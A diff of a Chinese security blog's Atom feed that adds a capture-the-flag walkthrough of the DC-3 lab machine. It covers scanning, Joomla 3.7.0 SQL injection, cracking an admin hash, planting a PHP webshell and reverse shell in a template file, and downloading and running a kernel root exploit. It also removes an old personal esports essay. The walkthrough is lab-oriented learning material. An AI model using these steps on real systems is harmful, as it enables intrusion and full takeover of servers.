@@ -6,7 +6,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="https://www.twosmi1e.com/"/>
-  <updated>2019-10-17T02:27:54.937Z</updated>
+  <updated>2019-10-21T06:03:37.790Z</updated>
   <id>https://www.twosmi1e.com/</id>
   
   <author>
@@ -15,6 +15,27 @@
   </author>
   
   <generator uri="http://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>DC-3渗透报告</title>
+    <link href="https://www.twosmi1e.com/2019/10/21/DC-3%E6%B8%97%E9%80%8F%E6%8A%A5%E5%91%8A/"/>
+    <id>https://www.twosmi1e.com/2019/10/21/DC-3渗透报告/</id>
+    <published>2019-10-21T05:59:12.000Z</published>
+    <updated>2019-10-21T06:03:37.790Z</updated>
+    
+    <content type="html"><![CDATA[<p><img src="/2019/10/21/DC-3渗透报告/1562577223049.png" alt="Alt text"><br>扫一下IP找到DC-3IP<br><img src="/2019/10/21/DC-3渗透报告/1562577254830.png" alt="Alt text"></p><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><ul><li>nmap<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -A 192.168.61.144 -p 1-65535</span><br></pre></td></tr></table></figure></li></ul><p><img src="/2019/10/21/DC-3渗透报告/1562583316250.png" alt="Alt text"><br>80web服务 Joomla</p><ul><li>whatweb<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">whatweb http://192.168.61.144/</span><br></pre></td></tr></table></figure></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.61.144 [200 OK] Apache[2.4.18], Cookies[460ada11b31d3c5e5ca6e58fd5d3de27], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.18 (Ubuntu)], HttpOnly[460ada11b31d3c5e5ca6e58fd5d3de27], IP[192.168.61.144], JQuery, MetaGenerator[Joomla! - Open Source Content Management], PasswordField[password], Script[application/json], Title[Home]</span><br></pre></td></tr></table></figure><ul><li>nikto</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nikto -h http://192.168.61.144</span><br></pre></td></tr></table></figure><p><img src="/2019/10/21/DC-3渗透报告/1562583659899.png" alt="Alt text"></p><p>使用Joomscan<br><img src="/2019/10/21/DC-3渗透报告/1562583750704.png" alt="Alt text"><br><img src="/2019/10/21/DC-3渗透报告/1562583758368.png" alt="Alt text"><br>知晓版本<code>Joomla 3.7.0</code><br><img src="/2019/10/21/DC-3渗透报告/1562583887784.png" alt="Alt text"><br>发现有sql注入的洞<br><code>searchsploit -m 42033</code><br>cat 一下txt<br><img src="/2019/10/21/DC-3渗透报告/1562583996627.png" alt="Alt text"></p><h2 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h2><p>爆库<br><img src="/2019/10/21/DC-3渗透报告/1562584186917.png" alt="Alt text"><br>爆表<br><img src="/2019/10/21/DC-3渗透报告/1562584386775.png" alt="Alt text"><br><img src="/2019/10/21/DC-3渗透报告/1562584399813.png" alt="Alt text"><br>爆字段<br><img src="/2019/10/21/DC-3渗透报告/1562584940320.png" alt="Alt text"><br>爆内容<br><img src="/2019/10/21/DC-3渗透报告/1562585043363.png" alt="Alt text"></p><p>john破解hash<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">echo &apos;$2y$10$DpfpYjADpejngxNh9GnmCeyIHCWpL97CVRnGeZsVJwR0kWFlfB1Zu&apos; &gt; joompass.txt</span><br><span class="line">john joompass.txt</span><br></pre></td></tr></table></figure></p><p><img src="/2019/10/21/DC-3渗透报告/1562585495554.png" alt="Alt text"></p><h2 id="写shell反弹"><a href="#写shell反弹" class="headerlink" title="写shell反弹"></a>写shell反弹</h2><p>登入网站后台<br>修改<code>templates/beez3/error.php</code>写入一句话<br><img src="/2019/10/21/DC-3渗透报告/1562585660121.png" alt="Alt text"><br>连不上 用PHP反弹shell<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# locate php-reverse-shell.php</span><br><span class="line">/usr/share/beef-xss/modules/exploits/m0n0wall/php-reverse-shell.php</span><br><span class="line">/usr/share/laudanum/php/php-reverse-shell.php</span><br><span class="line">/usr/share/laudanum/wordpress/templates/php-reverse-shell.php</span><br><span class="line">/usr/share/webshells/php/php-reverse-shell.php</span><br></pre></td></tr></table></figure></p><p>选一个用<br>写入<code>error.php</code><br><img src="/2019/10/21/DC-3渗透报告/1562586628869.png" alt="Alt text"></p><p>设置IP端口 监听端口 反弹回shell<br><img src="/2019/10/21/DC-3渗透报告/1562586580527.png" alt="Alt text"><br>看一下权限<br><img src="/2019/10/21/DC-3渗透报告/1562586641430.png" alt="Alt text"></p><h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>然后提权<br>查看系统信息</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">$ cat /etc/os-release</span><br><span class="line">NAME=&quot;Ubuntu&quot;</span><br><span class="line">VERSION=&quot;16.04 LTS (Xenial Xerus)&quot;</span><br><span class="line">ID=ubuntu</span><br><span class="line">ID_LIKE=debian</span><br><span class="line">PRETTY_NAME=&quot;Ubuntu 16.04 LTS&quot;</span><br><span class="line">VERSION_ID=&quot;16.04&quot;</span><br><span class="line">HOME_URL=&quot;http://www.ubuntu.com/&quot;</span><br><span class="line">SUPPORT_URL=&quot;http://help.ubuntu.com/&quot;</span><br><span class="line">BUG_REPORT_URL=&quot;http://bugs.launchpad.net/ubuntu/&quot;</span><br><span class="line">UBUNTU_CODENAME=xenial</span><br></pre></td></tr></table></figure><p>是Ubuntu 16.04的<br><img src="/2019/10/21/DC-3渗透报告/1562587060838.png" alt="Alt text"><br>找一个本地提权的<br><code>cat /usr/share/exploitdb/exploits/linux/local/39772.txt</code><br><img src="/2019/10/21/DC-3渗透报告/1562587153202.png" alt="Alt text"><br>用wget下载下来<br><img src="/2019/10/21/DC-3渗透报告/1562588323284.png" alt="Alt text"><br>这个目录没有权限 切换到/tmp/下 创建一个exp目录<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ mkdir exp</span><br><span class="line">$ ls</span><br><span class="line">$ cd exp</span><br><span class="line">$ wget https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/39772.zip</span><br></pre></td></tr></table></figure></p><p><img src="/2019/10/21/DC-3渗透报告/1562588425899.png" alt="Alt text"><br>解压给权限运行<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">$ tar -xvf exploit.tar</span><br><span class="line">ebpf_mapfd_doubleput_exploit/</span><br><span class="line">ebpf_mapfd_doubleput_exploit/hello.c</span><br><span class="line">ebpf_mapfd_doubleput_exploit/suidhelper.c</span><br><span class="line">ebpf_mapfd_doubleput_exploit/compile.sh</span><br><span class="line">ebpf_mapfd_doubleput_exploit/doubleput.c</span><br><span class="line">$ chmod +x compile.sh</span><br><span class="line">$ ./compile.sh</span><br><span class="line">doubleput.c: In function &apos;make_setuid&apos;:</span><br><span class="line">doubleput.c:91:13: warning: cast from pointer to integer of different size [-Wpointer-to-int-cast]</span><br><span class="line">    .insns = (__aligned_u64) insns,</span><br><span class="line">             ^</span><br><span class="line">doubleput.c:92:15: warning: cast from pointer to integer of different size [-Wpointer-to-int-cast]</span><br><span class="line">    .license = (__aligned_u64)&quot;&quot;</span><br><span class="line">               ^</span><br><span class="line">$ ls -la</span><br><span class="line">total 60</span><br><span class="line">drwxr-x--- 2 www-data www-data  4096 Jul  8 22:14 .</span><br><span class="line">drwxr-xr-x 3 www-data www-data  4096 Jul  8 22:12 ..</span><br><span class="line">-rwxrwxrwx 1 www-data www-data   155 Apr 26  2016 compile.sh</span><br><span class="line">-rwxrwxrwx 1 www-data www-data 12336 Jul  8 22:14 doubleput</span><br><span class="line">-rw-r----- 1 www-data www-data  4188 Apr 26  2016 doubleput.c</span><br><span class="line">-rwxrwxrwx 1 www-data www-data  8028 Jul  8 22:14 hello</span><br><span class="line">-rw-r----- 1 www-data www-data  2186 Apr 26  2016 hello.c</span><br><span class="line">-rwxrwxrwx 1 www-data www-data  7524 Jul  8 22:14 suidhelper</span><br><span class="line">-rw-r----- 1 www-data www-data   255 Apr 26  2016 suidhelper.c</span><br><span class="line">$ ./doubleput</span><br><span class="line">starting writev</span><br><span class="line">woohoo, got pointer reuse</span><br><span class="line">writev returned successfully. if this worked, you&apos;ll have a root shell in &lt;=60 seconds.</span><br><span class="line">suid file detected, launching rootshell...</span><br><span class="line">we have root privs now...</span><br><span class="line">whoami</span><br><span class="line">root</span><br></pre></td></tr></table></figure></p><p><img src="/2019/10/21/DC-3渗透报告/1562588179585.png" alt="Alt text"><br>然后看flag<br><img src="/2019/10/21/DC-3渗透报告/1562588584981.png" alt="Alt text"></p>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;p&gt;&lt;img src=&quot;/2019/10/21/DC-3渗透报告/1562577223049.png&quot; alt=&quot;Alt text&quot;&gt;&lt;br&gt;扫一下IP找到DC-3IP&lt;br&gt;&lt;img src=&quot;/2019/10/21/DC-3渗透报告/1562577254830.png&quot; a
+      
+    
+    </summary>
+    
+    
+  </entry>
   
   <entry>
     <title>DC-2渗透报告</title>
@@ -396,9 +417,9 @@
     </summary>
     
     
-      <category term="wp" scheme="https://www.twosmi1e.com/tags/wp/"/>
-    
       <category term="ctf" scheme="https://www.twosmi1e.com/tags/ctf/"/>
+    
+      <category term="wp" scheme="https://www.twosmi1e.com/tags/wp/"/>
     
   </entry>
   
@@ -421,9 +442,9 @@
     </summary>
     
     
-      <category term="wp" scheme="https://www.twosmi1e.com/tags/wp/"/>
-    
       <category term="ctf" scheme="https://www.twosmi1e.com/tags/ctf/"/>
+    
+      <category term="wp" scheme="https://www.twosmi1e.com/tags/wp/"/>
     
   </entry>
   
@@ -466,29 +487,6 @@
     
     </summary>
     
-    
-  </entry>
-  
-  <entry>
-    <title>纪念我逝去的青春</title>
-    <link href="https://www.twosmi1e.com/2017/10/28/%E7%BA%AA%E5%BF%B5%E6%88%91%E9%80%9D%E5%8E%BB%E7%9A%84%E9%9D%92%E6%98%A5/"/>
-    <id>https://www.twosmi1e.com/2017/10/28/纪念我逝去的青春/</id>
-    <published>2017-10-28T15:14:35.000Z</published>
-    <updated>2018-08-02T16:24:10.402Z</updated>
-    
-    <content type="html"><![CDATA[<p>  &nbsp;&nbsp;当第五局开场Sliver&nbsp;Scrapes响起的时候，我已经想到了RNG赢下比赛去往鸟巢的场景，我还以为所有那五个满身热血的少年最后能成功饮血屠龙。<br>  &nbsp;&nbsp;看到最后只剩两个人，小狗被追上高地letme最后冲过来两个人死在一起的时候，真的心中一凉，原来真的 青春不一定会圆满啊。</p><p>  &nbsp;&nbsp;这个BO5，看到了小狗的vn，看到了letme的纳尔，看到了虎九万的飞机，看到了香锅两把MVP的表现，真的足够了，唯一遗憾的就是没能打败SKT<br>晋级总决赛吧。</p><p>  &nbsp;&nbsp;从S2到S7，五年了，初中时刚刚知晓英雄联盟，和同学一起去黑网吧打人机还打的津津有味。高中那时进一个网吧清一色的英雄联盟，中午觉都不睡去打一把就是为了拿首胜买英雄，逃晚自习逃课和同学一起出去双排，最开心的事情就是和一群兄弟一起去网吧五黑，那时的微笑，草莓，若风，那时的WE，都是回忆啊。今年可以说是LPL最有希望的一年，是RNG最有希望的一年，在家门口打比赛，所有玩过英雄联盟的人都在关注着，为LPL加油，这也是ADC强势的版本，小狗状态也很好，天时地利人和，真的希望RNG全华班能夺冠，买上一个冠军皮肤，然后打上两把告别召唤师峡谷。当初一起玩LOL的人都已经陆续离开了，守望先锋，绝地求生，或是不玩游戏了，毕竟都已经长大了，据说S8还要改符文系统，我已经没有那么多精力再去适应新版本再去玩游戏了吧，所以可能S7就是最后一次追这赛事了吧，和LPL一起逝去的，是那些回忆那些青春啊！<br>  &nbsp;&nbsp;ROYAL NERVER GIVE UP！今天RNG是站着死的，不想喷任何人，也不想他们被喷，在我心中香锅就是世界第一打野，世界上只有一个VN叫uzi，谁说LPL只有蓝领型上单我们有letme，ming的凤女洛都曾带来精彩的表演，还有单杀faker的虎将军，你们，真的已经很棒了。<br>  &nbsp;&nbsp;曾在比赛之前想，如果S7LPL夺冠了，会带来什么？英雄联盟又能多火几年。但这对于我来说，对于我们这些从S1，S2开始的老玩家来说，这是一次青春的完美谢幕，为我那曾经逃课上网的网瘾少年的时光，画上一个圆满的句号。可是不如意事常八九，不可能总是事事圆满。<br>  &nbsp;&nbsp;传奇还在继续，Legend&nbsp;never&nbsp;die，希望LPL不要放弃</p><p>  &nbsp;&nbsp;今夜再矫情一次，再中二一次，再难过地哭一次，为与胜利失之交臂的RNG，也为我逝去的青春。</p>]]></content>
-    
-    <summary type="html">
-    
-      
-      
-        &lt;p&gt;  &amp;nbsp;&amp;nbsp;当第五局开场Sliver&amp;nbsp;Scrapes响起的时候，我已经想到了RNG赢下比赛去往鸟巢的场景，我还以为所有那五个满身热血的少年最后能成功饮血屠龙。&lt;br&gt;  &amp;nbsp;&amp;nbsp;看到最后只剩两个人，小狗被追上高地letme最后冲过来
-      
-    
-    </summary>
-    
-    
-      <category term="随笔" scheme="https://www.twosmi1e.com/tags/%E9%9A%8F%E7%AC%94/"/>
     
   </entry>
   
